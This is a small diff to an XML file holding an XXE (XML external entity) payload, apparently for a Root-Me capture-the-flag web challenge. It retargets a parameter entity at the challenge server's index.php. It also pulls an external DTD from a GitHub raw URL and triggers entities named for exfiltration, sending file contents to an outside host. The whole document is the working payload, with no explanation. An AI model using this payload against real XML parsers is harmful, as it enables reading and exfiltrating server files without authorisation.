@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-<!ENTITY % b SYSTEM "file://.index.php">
+<!ENTITY % b SYSTEM "file:///challenge/web-serveur/ch29/index.php">
 <!ENTITY % xxe SYSTEM "https://raw.githubusercontent.com/kallly/ROOTME/main/extern60.dtd"> %b;%xxe;%test1;%exfil;%test2; ]>
 <xxe>1</xxe>
